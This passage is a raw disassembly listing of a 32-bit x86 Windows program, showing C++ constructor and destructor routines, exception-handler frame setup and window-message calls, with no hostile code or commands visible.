  401d5e:	56                   	push   %esi
  401d5f:	8b f1                	mov    %ecx,%esi
  401d61:	c7 06 34 38 42 00    	movl   $0x423834,(%esi)
  401d67:	74 06                	je     0x401d6f
  401d69:	56                   	push   %esi
  401d6a:	e8 9e cf 01 00       	call   0x41ed0d
  401d6f:	8b c6                	mov    %esi,%eax
  401d71:	5e                   	pop    %esi
  401d72:	c2 04 00             	ret    $0x4
  401d75:	6a 04                	push   $0x4
  401d77:	e8 73 cf 01 00       	call   0x41ecef
  401d7c:	85 c0                	test   %eax,%eax
  401d7e:	74 07                	je     0x401d87
  401d80:	c7 00 ec 39 42 00    	movl   $0x4239ec,(%eax)
  401d86:	c3                   	ret
  401d87:	33 c0                	xor    %eax,%eax
  401d89:	c3                   	ret
  401d8a:	56                   	push   %esi
  401d8b:	8b f1                	mov    %ecx,%esi
  401d8d:	e8 bb da 01 00       	call   0x41f84d
  401d92:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  401d97:	74 06                	je     0x401d9f
  401d99:	56                   	push   %esi
  401d9a:	e8 6e cf 01 00       	call   0x41ed0d
  401d9f:	8b c6                	mov    %esi,%eax
  401da1:	5e                   	pop    %esi
  401da2:	c2 04 00             	ret    $0x4
  401da5:	56                   	push   %esi
  401da6:	8b f1                	mov    %ecx,%esi
  401da8:	e8 14 00 00 00       	call   0x401dc1
  401dad:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  401db2:	74 07                	je     0x401dbb
  401db4:	56                   	push   %esi
  401db5:	e8 de e8 00 00       	call   0x410698
  401dba:	59                   	pop    %ecx
  401dbb:	8b c6                	mov    %esi,%eax
  401dbd:	5e                   	pop    %esi
  401dbe:	c2 04 00             	ret    $0x4
  401dc1:	b8 68 0c 42 00       	mov    $0x420c68,%eax
  401dc6:	e8 25 0b 00 00       	call   0x4028f0
  401dcb:	56                   	push   %esi
  401dcc:	8b f1                	mov    %ecx,%esi
  401dce:	c7 06 9c 3c 42 00    	movl   $0x423c9c,(%esi)
  401dd4:	83 64 24 0c 00       	andl   $0x0,0xc(%esp)
  401dd9:	8d 4e 10             	lea    0x10(%esi),%ecx
  401ddc:	e8 3c 30 01 00       	call   0x414e1d
  401de1:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401de5:	c7 06 14 34 42 00    	movl   $0x423414,(%esi)
  401deb:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401df2:	5e                   	pop    %esi
  401df3:	c9                   	leave
  401df4:	c3                   	ret
  401df5:	ff 74 24 04          	push   0x4(%esp)
  401df9:	83 c1 0c             	add    $0xc,%ecx
  401dfc:	e8 64 31 01 00       	call   0x414f65
  401e01:	c2 04 00             	ret    $0x4
  401e04:	8b 01                	mov    (%ecx),%eax
  401e06:	ff a0 e8 00 00 00    	jmp    *0xe8(%eax)
  401e0c:	b8 c3 0d 42 00       	mov    $0x420dc3,%eax
  401e11:	e8 da 0a 00 00       	call   0x4028f0
  401e16:	51                   	push   %ecx
  401e17:	56                   	push   %esi
  401e18:	8b f1                	mov    %ecx,%esi
  401e1a:	89 75 f0             	mov    %esi,-0x10(%ebp)
  401e1d:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401e24:	e8 57 3e 01 00       	call   0x415c80
  401e29:	80 65 fc 00          	andb   $0x0,-0x4(%ebp)
  401e2d:	8d 4e 1c             	lea    0x1c(%esi),%ecx
  401e30:	e8 66 e4 00 00       	call   0x41029b
  401e35:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  401e39:	8b ce                	mov    %esi,%ecx
  401e3b:	e8 5b e4 00 00       	call   0x41029b
  401e40:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401e43:	5e                   	pop    %esi
  401e44:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401e4b:	c9                   	leave
  401e4c:	c3                   	ret
  401e4d:	56                   	push   %esi
  401e4e:	8b f1                	mov    %ecx,%esi
  401e50:	e8 14 00 00 00       	call   0x401e69
  401e55:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  401e5a:	74 07                	je     0x401e63
  401e5c:	56                   	push   %esi
  401e5d:	e8 36 e8 00 00       	call   0x410698
  401e62:	59                   	pop    %ecx
  401e63:	8b c6                	mov    %esi,%eax
  401e65:	5e                   	pop    %esi
  401e66:	c2 04 00             	ret    $0x4
  401e69:	b8 f8 0d 42 00       	mov    $0x420df8,%eax
  401e6e:	e8 7d 0a 00 00       	call   0x4028f0
  401e73:	51                   	push   %ecx
  401e74:	56                   	push   %esi
  401e75:	8b f1                	mov    %ecx,%esi
  401e77:	89 75 f0             	mov    %esi,-0x10(%ebp)
  401e7a:	c7 06 3c 40 42 00    	movl   $0x42403c,(%esi)
  401e80:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  401e84:	e8 3c 37 01 00       	call   0x4155c5
  401e89:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401e8c:	c7 06 14 34 42 00    	movl   $0x423414,(%esi)
  401e92:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401e99:	5e                   	pop    %esi
  401e9a:	c9                   	leave
  401e9b:	c3                   	ret
  401e9c:	56                   	push   %esi
  401e9d:	8b f1                	mov    %ecx,%esi
  401e9f:	ff 74 24 08          	push   0x8(%esp)
  401ea3:	e8 49 37 01 00       	call   0x4155f1
  401ea8:	8b 44 24 0c          	mov    0xc(%esp),%eax
  401eac:	83 66 0c 00          	andl   $0x0,0xc(%esi)
  401eb0:	83 66 10 00          	andl   $0x0,0x10(%esi)
  401eb4:	89 86 94 00 00 00    	mov    %eax,0x94(%esi)
  401eba:	c7 06 fc 40 42 00    	movl   $0x4240fc,(%esi)
  401ec0:	8b c6                	mov    %esi,%eax
  401ec2:	5e                   	pop    %esi
  401ec3:	c2 08 00             	ret    $0x8
  401ec6:	56                   	push   %esi
  401ec7:	8b f1                	mov    %ecx,%esi
  401ec9:	ff 74 24 08          	push   0x8(%esp)
  401ecd:	e8 1f 37 01 00       	call   0x4155f1
  401ed2:	8b 44 24 0c          	mov    0xc(%esp),%eax
  401ed6:	83 66 0c 00          	andl   $0x0,0xc(%esi)
  401eda:	83 66 10 00          	andl   $0x0,0x10(%esi)
  401ede:	89 86 94 00 00 00    	mov    %eax,0x94(%esi)
  401ee4:	c7 06 1c 41 42 00    	movl   $0x42411c,(%esi)
  401eea:	8b c6                	mov    %esi,%eax
  401eec:	5e                   	pop    %esi
  401eed:	c2 08 00             	ret    $0x8
  401ef0:	56                   	push   %esi
  401ef1:	8b f1                	mov    %ecx,%esi
  401ef3:	e8 d5 fc ff ff       	call   0x401bcd
  401ef8:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  401efd:	74 07                	je     0x401f06
  401eff:	56                   	push   %esi
  401f00:	e8 93 e7 00 00       	call   0x410698
  401f05:	59                   	pop    %ecx
  401f06:	8b c6                	mov    %esi,%eax
  401f08:	5e                   	pop    %esi
  401f09:	c2 04 00             	ret    $0x4
  401f0c:	e9 0c e9 00 00       	jmp    0x41081d
  401f11:	56                   	push   %esi
  401f12:	8b f1                	mov    %ecx,%esi
  401f14:	e8 c1 f3 00 00       	call   0x4112da
  401f19:	83 f8 ff             	cmp    $0xffffffff,%eax
  401f1c:	75 04                	jne    0x401f22
  401f1e:	0b c0                	or     %eax,%eax
  401f20:	eb 14                	jmp    0x401f36
  401f22:	6a 00                	push   $0x0
  401f24:	6a 14                	push   $0x14
  401f26:	68 1e 04 00 00       	push   $0x41e
  401f2b:	ff 76 1c             	push   0x1c(%esi)
  401f2e:	ff 15 38 1a 43 00    	call   *0x431a38
  401f34:	33 c0                	xor    %eax,%eax
  401f36:	5e                   	pop    %esi
  401f37:	c2 04 00             	ret    $0x4
  401f3a:	56                   	push   %esi
  401f3b:	57                   	push   %edi
  401f3c:	6a 00                	push   $0x0
  401f3e:	8b 3d 38 1a 43 00    	mov    0x431a38,%edi
  401f44:	ff 74 24 10          	push   0x10(%esp)
  401f48:	8b f1                	mov    %ecx,%esi
  401f4a:	68 02 10 00 00       	push   $0x1002
  401f4f:	ff 76 1c             	push   0x1c(%esi)
  401f52:	ff d7                	call   *%edi
  401f54:	50                   	push   %eax
  401f55:	e8 ed 01 00 00       	call   0x402147
  401f5a:	85 c0                	test   %eax,%eax
  401f5c:	74 10                	je     0x401f6e
  401f5e:	6a 00                	push   $0x0
  401f60:	ff 74 24 10          	push   0x10(%esp)
  401f64:	68 03 10 00 00       	push   $0x1003
  401f69:	ff 76 1c             	push   0x1c(%esi)
  401f6c:	ff d7                	call   *%edi
  401f6e:	5f                   	pop    %edi
  401f6f:	5e                   	pop    %esi
  401f70:	c2 04 00             	ret    $0x4
  401f73:	56                   	push   %esi
  401f74:	8b f1                	mov    %ecx,%esi
  401f76:	6a 00                	push   $0x0
  401f78:	e8 bd ff ff ff       	call   0x401f3a
  401f7d:	6a 01                	push   $0x1
  401f7f:	8b ce                	mov    %esi,%ecx
  401f81:	e8 b4 ff ff ff       	call   0x401f3a
  401f86:	6a 02                	push   $0x2
  401f88:	8b ce                	mov    %esi,%ecx
  401f8a:	e8 ab ff ff ff       	call   0x401f3a
  401f8f:	8b ce                	mov    %esi,%ecx
  401f91:	e8 6a fb 00 00       	call   0x411b00
  401f96:	5e                   	pop    %esi
  401f97:	c3                   	ret
  401f98:	56                   	push   %esi
  401f99:	57                   	push   %edi
  401f9a:	6a 00                	push   $0x0
  401f9c:	8b 3d 38 1a 43 00    	mov    0x431a38,%edi
  401fa2:	ff 74 24 10          	push   0x10(%esp)
  401fa6:	8b f1                	mov    %ecx,%esi
  401fa8:	68 08 11 00 00       	push   $0x1108
  401fad:	ff 76 1c             	push   0x1c(%esi)
  401fb0:	ff d7                	call   *%edi
  401fb2:	50                   	push   %eax
  401fb3:	e8 8f 01 00 00       	call   0x402147
  401fb8:	85 c0                	test   %eax,%eax
  401fba:	74 10                	je     0x401fcc
  401fbc:	6a 00                	push   $0x0
  401fbe:	ff 74 24 10          	push   0x10(%esp)
  401fc2:	68 09 11 00 00       	push   $0x1109
  401fc7:	ff 76 1c             	push   0x1c(%esi)
  401fca:	ff d7                	call   *%edi
  401fcc:	5f                   	pop    %edi
  401fcd:	5e                   	pop    %esi
  401fce:	c2 04 00             	ret    $0x4
  401fd1:	56                   	push   %esi
  401fd2:	8b f1                	mov    %ecx,%esi
  401fd4:	6a 00                	push   $0x0
  401fd6:	e8 bd ff ff ff       	call   0x401f98
  401fdb:	6a 02                	push   $0x2
  401fdd:	8b ce                	mov    %esi,%ecx
  401fdf:	e8 b4 ff ff ff       	call   0x401f98
  401fe4:	8b ce                	mov    %esi,%ecx
  401fe6:	e8 f7 fa 00 00       	call   0x411ae2
  401feb:	5e                   	pop    %esi
  401fec:	c3                   	ret
  401fed:	56                   	push   %esi
  401fee:	57                   	push   %edi
  401fef:	8b 3d 38 1a 43 00    	mov    0x431a38,%edi
  401ff5:	6a 00                	push   $0x0
  401ff7:	8b f1                	mov    %ecx,%esi
  401ff9:	6a 00                	push   $0x0
  401ffb:	68 02 13 00 00       	push   $0x1302
  402000:	ff 76 1c             	push   0x1c(%esi)
  402003:	ff d7                	call   *%edi
  402005:	50                   	push   %eax
  402006:	e8 3c 01 00 00       	call   0x402147
  40200b:	85 c0                	test   %eax,%eax
  40200d:	74 0e                	je     0x40201d
  40200f:	6a 00                	push   $0x0
  402011:	6a 00                	push   $0x0
  402013:	68 03 13 00 00       	push   $0x1303
  402018:	ff 76 1c             	push   0x1c(%esi)
  40201b:	ff d7                	call   *%edi
  40201d:	8b ce                	mov    %esi,%ecx
  40201f:	e8 be fa 00 00       	call   0x411ae2
  402024:	5f                   	pop    %edi
  402025:	5e                   	pop    %esi
  402026:	c3                   	ret
  402027:	8b c1                	mov    %ecx,%eax
  402029:	83 60 04 00          	andl   $0x0,0x4(%eax)
  40202d:	c7 00 b4 4a 42 00    	movl   $0x424ab4,(%eax)
  402033:	c3                   	ret
  402034:	56                   	push   %esi
  402035:	8b f1                	mov    %ecx,%esi
  402037:	e8 14 00 00 00       	call   0x402050
  40203c:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  402041:	74 07                	je     0x40204a
  402043:	56                   	push   %esi
  402044:	e8 4f e6 00 00       	call   0x410698
  402049:	59                   	pop    %ecx
  40204a:	8b c6                	mov    %esi,%eax
  40204c:	5e                   	pop    %esi
  40204d:	c2 04 00             	ret    $0x4
  402050:	b8 dc 12 42 00       	mov    $0x4212dc,%eax
  402055:	e8 96 08 00 00       	call   0x4028f0
  40205a:	51                   	push   %ecx
  40205b:	56                   	push   %esi
  40205c:	8b f1                	mov    %ecx,%esi
  40205e:	89 75 f0             	mov    %esi,-0x10(%ebp)
  402061:	c7 06 b4 4a 42 00    	movl   $0x424ab4,(%esi)
  402067:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40206b:	e8 ad 00 00 00       	call   0x40211d
  402070:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402073:	c7 06 14 34 42 00    	movl   $0x423414,(%esi)
  402079:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402080:	5e                   	pop    %esi
  402081:	c9                   	leave
  402082:	c3                   	ret
  402083:	56                   	push   %esi
  402084:	8b f1                	mov    %ecx,%esi
  402086:	57                   	push   %edi
  402087:	8b 7e 04             	mov    0x4(%esi),%edi
  40208a:	85 ff                	test   %edi,%edi
  40208c:	74 16                	je     0x4020a4
  40208e:	6a 00                	push   $0x0
  402090:	e8 18 00 00 00       	call   0x4020ad
  402095:	85 c0                	test   %eax,%eax
  402097:	59                   	pop    %ecx
  402098:	74 0a                	je     0x4020a4
  40209a:	ff 76 04             	push   0x4(%esi)
  40209d:	8b c8                	mov    %eax,%ecx
  40209f:	e8 42 e3 00 00       	call   0x4103e6
  4020a4:	83 66 04 00          	andl   $0x0,0x4(%esi)
  4020a8:	8b c7                	mov    %edi,%eax
  4020aa:	5f                   	pop    %edi
  4020ab:	5e                   	pop    %esi
  4020ac:	c3                   	ret
  4020ad:	b8 f2 12 42 00       	mov    $0x4212f2,%eax
  4020b2:	e8 39 08 00 00       	call   0x4028f0
  4020b7:	56                   	push   %esi
  4020b8:	e8 4a d5 01 00       	call   0x41f607
  4020bd:	8b f0                	mov    %eax,%esi
  4020bf:	83 7e 24 00          	cmpl   $0x0,0x24(%esi)
  4020c3:	75 48                	jne    0x40210d
  4020c5:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  4020c9:	74 42                	je     0x40210d
  4020cb:	53                   	push   %ebx
  4020cc:	68 cf 97 41 00       	push   $0x4197cf
  4020d1:	e8 72 e5 00 00       	call   0x410648
  4020d6:	6a 44                	push   $0x44
  4020d8:	8b d8                	mov    %eax,%ebx
  4020da:	e8 7d e5 00 00       	call   0x41065c
  4020df:	59                   	pop    %ecx
  4020e0:	8b c8                	mov    %eax,%ecx
  4020e2:	89 4d 08             	mov    %ecx,0x8(%ebp)
  4020e5:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4020e9:	85 c9                	test   %ecx,%ecx
  4020eb:	74 10                	je     0x4020fd
  4020ed:	6a 01                	push   $0x1
  4020ef:	6a 04                	push   $0x4
  4020f1:	68 b8 49 42 00       	push   $0x4249b8
  4020f6:	e8 4e 3a 01 00       	call   0x415b49
  4020fb:	eb 02                	jmp    0x4020ff
  4020fd:	33 c0                	xor    %eax,%eax
  4020ff:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  402103:	53                   	push   %ebx
  402104:	89 46 24             	mov    %eax,0x24(%esi)
  402107:	e8 3c e5 00 00       	call   0x410648
  40210c:	5b                   	pop    %ebx
  40210d:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402110:	8b 46 24             	mov    0x24(%esi),%eax
  402113:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40211a:	5e                   	pop    %esi
  40211b:	c9                   	leave
  40211c:	c3                   	ret
  40211d:	83 79 04 00          	cmpl   $0x0,0x4(%ecx)
  402121:	75 03                	jne    0x402126
  402123:	33 c0                	xor    %eax,%eax
  402125:	c3                   	ret
  402126:	e8 58 ff ff ff       	call   0x402083
  40212b:	50                   	push   %eax
  40212c:	ff 15 1c 16 43 00    	call   *0x43161c
  402132:	c3                   	ret
  402133:	6a 00                	push   $0x0
  402135:	e8 73 ff ff ff       	call   0x4020ad
  40213a:	85 c0                	test   %eax,%eax
  40213c:	59                   	pop    %ecx
  40213d:	74 07                	je     0x402146
  40213f:	8b c8                	mov    %eax,%ecx
  402141:	e9 3a 3b 01 00       	jmp    0x415c80
  402146:	c3                   	ret
  402147:	6a 00                	push   $0x0
  402149:	e8 5f ff ff ff       	call   0x4020ad
  40214e:	59                   	pop    %ecx
  40214f:	8b c8                	mov    %eax,%ecx
  402151:	33 c0                	xor    %eax,%eax
  402153:	85 c9                	test   %ecx,%ecx
  402155:	74 09                	je     0x402160
  402157:	ff 74 24 04          	push   0x4(%esp)
  40215b:	e8 03 e2 00 00       	call   0x410363
  402160:	c2 04 00             	ret    $0x4
  402163:	56                   	push   %esi
  402164:	8b f1                	mov    %ecx,%esi
  402166:	e8 a1 fd ff ff       	call   0x401f0c
  40216b:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  402170:	74 07                	je     0x402179
  402172:	56                   	push   %esi
  402173:	e8 20 e5 00 00       	call   0x410698
  402178:	59                   	pop    %ecx
  402179:	8b c6                	mov    %esi,%eax
  40217b:	5e                   	pop    %esi
  40217c:	c2 04 00             	ret    $0x4
  40217f:	cc                   	int3
  402180:	55                   	push   %ebp
  402181:	8b ec                	mov    %esp,%ebp
  402183:	51                   	push   %ecx
  402184:	53                   	push   %ebx
  402185:	56                   	push   %esi
  402186:	57                   	push   %edi
  402187:	8b 45 0c             	mov    0xc(%ebp),%eax
  40218a:	83 c0 0c             	add    $0xc,%eax
  40218d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402190:	64 8b 1d 00 00 00 00 	mov    %fs:0x0,%ebx
  402197:	8b 03                	mov    (%ebx),%eax
  402199:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  40219f:	8b 45 08             	mov    0x8(%ebp),%eax
  4021a2:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  4021a5:	8b 63 fc             	mov    -0x4(%ebx),%esp
  4021a8:	8b 6d fc             	mov    -0x4(%ebp),%ebp
  4021ab:	ff e0                	jmp    *%eax
  4021ad:	5f                   	pop    %edi
  4021ae:	5e                   	pop    %esi
  4021af:	5b                   	pop    %ebx
  4021b0:	8b e5                	mov    %ebp,%esp
  4021b2:	5d                   	pop    %ebp
  4021b3:	c2 08 00             	ret    $0x8
  4021b6:	cc                   	int3
  4021b7:	cc                   	int3
  4021b8:	cc                   	int3
  4021b9:	cc                   	int3
  4021ba:	cc                   	int3
  4021bb:	cc                   	int3
  4021bc:	cc                   	int3
  4021bd:	cc                   	int3
  4021be:	cc                   	int3
  4021bf:	cc                   	int3
  4021c0:	58                   	pop    %eax
  4021c1:	59                   	pop    %ecx
  4021c2:	87 04 24             	xchg   %eax,(%esp)
  4021c5:	ff e0                	jmp    *%eax
  4021c7:	cc                   	int3
  4021c8:	cc                   	int3
  4021c9:	cc                   	int3
  4021ca:	cc                   	int3
  4021cb:	cc                   	int3
  4021cc:	cc                   	int3
  4021cd:	cc                   	int3
  4021ce:	cc                   	int3
  4021cf:	cc                   	int3
  4021d0:	55                   	push   %ebp
  4021d1:	8b ec                	mov    %esp,%ebp
  4021d3:	83 ec 08             	sub    $0x8,%esp
  4021d6:	53                   	push   %ebx
  4021d7:	56                   	push   %esi
  4021d8:	57                   	push   %edi
  4021d9:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4021df:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4021e2:	c7 45 fc fc 21 40 00 	movl   $0x4021fc,-0x4(%ebp)
  4021e9:	6a 00                	push   $0x0
  4021eb:	8b 45 0c             	mov    0xc(%ebp),%eax
  4021ee:	50                   	push   %eax
  4021ef:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4021f2:	51                   	push   %ecx
  4021f3:	8b 55 08             	mov    0x8(%ebp),%edx
  4021f6:	52                   	push   %edx
  4021f7:	e8 a4 9a 00 00       	call   0x40bca0
  4021fc:	8b 45 0c             	mov    0xc(%ebp),%eax
  4021ff:	8b 48 04             	mov    0x4(%eax),%ecx
  402202:	83 e1 fd             	and    $0xfffffffd,%ecx
  402205:	8b 55 0c             	mov    0xc(%ebp),%edx
  402208:	89 4a 04             	mov    %ecx,0x4(%edx)
  40220b:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402211:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  402214:	89 03                	mov    %eax,(%ebx)
  402216:	64 89 1d 00 00 00 00 	mov    %ebx,%fs:0x0
  40221d:	5f                   	pop    %edi
  40221e:	5e                   	pop    %esi
  40221f:	5b                   	pop    %ebx
  402220:	8b e5                	mov    %ebp,%esp
  402222:	5d                   	pop    %ebp
  402223:	c2 08 00             	ret    $0x8
  402226:	cc                   	int3
  402227:	cc                   	int3
  402228:	cc                   	int3
  402229:	cc                   	int3
  40222a:	cc                   	int3
  40222b:	cc                   	int3
  40222c:	cc                   	int3
  40222d:	cc                   	int3
  40222e:	cc                   	int3
  40222f:	cc                   	int3
  402230:	55                   	push   %ebp
  402231:	8b ec                	mov    %esp,%ebp
  402233:	83 ec 04             	sub    $0x4,%esp
  402236:	53                   	push   %ebx
  402237:	56                   	push   %esi
  402238:	57                   	push   %edi
  402239:	fc                   	cld
  40223a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40223d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402240:	8b 4d 14             	mov    0x14(%ebp),%ecx
  402243:	8b 55 10             	mov    0x10(%ebp),%edx
  402246:	6a 00                	push   $0x0
  402248:	6a 00                	push   $0x0
  40224a:	6a 00                	push   $0x0
  40224c:	50                   	push   %eax
  40224d:	8b 45 0c             	mov    0xc(%ebp),%eax
  402250:	51                   	push   %ecx
  402251:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402254:	52                   	push   %edx
  402255:	50                   	push   %eax
  402256:	51                   	push   %ecx
  402257:	e8 14 26 00 00       	call   0x404870
  40225c:	83 c4 20             	add    $0x20,%esp
  40225f:	89 45 14             	mov    %eax,0x14(%ebp)
  402262:	5f                   	pop    %edi
  402263:	5e                   	pop    %esi
  402264:	5b                   	pop    %ebx
  402265:	8b 45 14             	mov    0x14(%ebp),%eax
  402268:	8b e5                	mov    %ebp,%esp
  40226a:	5d                   	pop    %ebp
  40226b:	c3                   	ret
  40226c:	90                   	nop
  40226d:	90                   	nop
  40226e:	90                   	nop
  40226f:	90                   	nop
  402270:	55                   	push   %ebp
  402271:	8b ec                	mov    %esp,%ebp
  402273:	83 ec 14             	sub    $0x14,%esp
  402276:	8b 55 14             	mov    0x14(%ebp),%edx
  402279:	8b 45 0c             	mov    0xc(%ebp),%eax
  40227c:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40227f:	42                   	inc    %edx
  402280:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  402287:	c7 45 f0 d0 22 40 00 	movl   $0x4022d0,-0x10(%ebp)
  40228e:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402291:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  402294:	89 55 fc             	mov    %edx,-0x4(%ebp)
  402297:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40229d:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4022a0:	8d 85 ec ff ff ff    	lea    -0x14(%ebp),%eax
  4022a6:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4022ac:	8b 45 18             	mov    0x18(%ebp),%eax
  4022af:	50                   	push   %eax
  4022b0:	51                   	push   %ecx
  4022b1:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4022b4:	51                   	push   %ecx
  4022b5:	e8 c6 2f 00 00       	call   0x405280
  4022ba:	8b c8                	mov    %eax,%ecx
  4022bc:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4022bf:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4022c5:	8b c1                	mov    %ecx,%eax
  4022c7:	8b e5                	mov    %ebp,%esp
  4022c9:	5d                   	pop    %ebp
  4022ca:	c3                   	ret
  4022cb:	90                   	nop
  4022cc:	90                   	nop
  4022cd:	90                   	nop
  4022ce:	90                   	nop
  4022cf:	90                   	nop
  4022d0:	55                   	push   %ebp
  4022d1:	8b ec                	mov    %esp,%ebp
  4022d3:	fc                   	cld
  4022d4:	8b 45 0c             	mov    0xc(%ebp),%eax
  4022d7:	6a 00                	push   $0x0
  4022d9:	50                   	push   %eax
  4022da:	8b 48 10             	mov    0x10(%eax),%ecx
  4022dd:	8b 50 08             	mov    0x8(%eax),%edx
  4022e0:	51                   	push   %ecx
  4022e1:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4022e4:	52                   	push   %edx
  4022e5:	8b 50 0c             	mov    0xc(%eax),%edx
  4022e8:	8b 45 08             	mov    0x8(%ebp),%eax
  4022eb:	6a 00                	push   $0x0
  4022ed:	51                   	push   %ecx
  4022ee:	52                   	push   %edx
  4022ef:	50                   	push   %eax
  4022f0:	e8 7b 25 00 00       	call   0x404870
  4022f5:	83 c4 20             	add    $0x20,%esp
  4022f8:	5d                   	pop    %ebp
  4022f9:	c3                   	ret
  4022fa:	90                   	nop
  4022fb:	90                   	nop
  4022fc:	90                   	nop
  4022fd:	90                   	nop
  4022fe:	90                   	nop
  4022ff:	90                   	nop
  402300:	55                   	push   %ebp
  402301:	8b ec                	mov    %esp,%ebp
  402303:	83 ec 34             	sub    $0x34,%esp
  402306:	53                   	push   %ebx
  402307:	56                   	push   %esi
  402308:	57                   	push   %edi
  402309:	c7 45 d8 00 00 00 00 	movl   $0x0,-0x28(%ebp)
  402310:	c7 45 dc d0 23 40 00 	movl   $0x4023d0,-0x24(%ebp)
  402317:	8b 45 18             	mov    0x18(%ebp),%eax
  40231a:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40231d:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  402320:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  402323:	8b 55 1c             	mov    0x1c(%ebp),%edx
  402326:	89 55 e8             	mov    %edx,-0x18(%ebp)
  402329:	8b 45 20             	mov    0x20(%ebp),%eax
  40232c:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40232f:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  402336:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  40233d:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  402344:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40234b:	c7 45 f0 9c 23 40 00 	movl   $0x40239c,-0x10(%ebp)
  402352:	89 65 f4             	mov    %esp,-0xc(%ebp)
  402355:	89 6d f8             	mov    %ebp,-0x8(%ebp)
  402358:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40235e:	89 45 d8             	mov    %eax,-0x28(%ebp)
  402361:	8d 85 d8 ff ff ff    	lea    -0x28(%ebp),%eax
  402367:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  40236d:	c7 45 cc 01 00 00 00 	movl   $0x1,-0x34(%ebp)
  402374:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402377:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  40237a:	8b 55 10             	mov    0x10(%ebp),%edx
  40237d:	89 55 d4             	mov    %edx,-0x2c(%ebp)
  402380:	8d 45 d0             	lea    -0x30(%ebp),%eax
  402383:	50                   	push   %eax
  402384:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402387:	8b 11                	mov    (%ecx),%edx
  402389:	52                   	push   %edx
  40238a:	e8 c1 2f 00 00       	call   0x405350
  40238f:	ff 50 68             	call   *0x68(%eax)
  402392:	83 c4 08             	add    $0x8,%esp
  402395:	c7 45 cc 00 00 00 00 	movl   $0x0,-0x34(%ebp)
  40239c:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  4023a0:	74 17                	je     0x4023b9
  4023a2:	64 8b 1d 00 00 00 00 	mov    %fs:0x0,%ebx
  4023a9:	8b 03                	mov    (%ebx),%eax
  4023ab:	8b 5d d8             	mov    -0x28(%ebp),%ebx
  4023ae:	89 03                	mov    %eax,(%ebx)
  4023b0:	64 89 1d 00 00 00 00 	mov    %ebx,%fs:0x0
  4023b7:	eb 09                	jmp    0x4023c2
  4023b9:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4023bc:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4023c2:	8b 45 cc             	mov    -0x34(%ebp),%eax
  4023c5:	5f                   	pop    %edi
  4023c6:	5e                   	pop    %esi
  4023c7:	5b                   	pop    %ebx
  4023c8:	8b e5                	mov    %ebp,%esp
  4023ca:	5d                   	pop    %ebp
  4023cb:	c3                   	ret
  4023cc:	cc                   	int3
  4023cd:	cc                   	int3
  4023ce:	cc                   	int3
  4023cf:	cc                   	int3
  4023d0:	55                   	push   %ebp
  4023d1:	8b ec                	mov    %esp,%ebp
  4023d3:	53                   	push   %ebx
  4023d4:	56                   	push   %esi
  4023d5:	57                   	push   %edi
  4023d6:	fc                   	cld
  4023d7:	8b 45 08             	mov    0x8(%ebp),%eax
  4023da:	8b 48 04             	mov    0x4(%eax),%ecx
  4023dd:	83 e1 66             	and    $0x66,%ecx
  4023e0:	85 c9                	test   %ecx,%ecx
  4023e2:	74 11                	je     0x4023f5
  4023e4:	8b 55 0c             	mov    0xc(%ebp),%edx
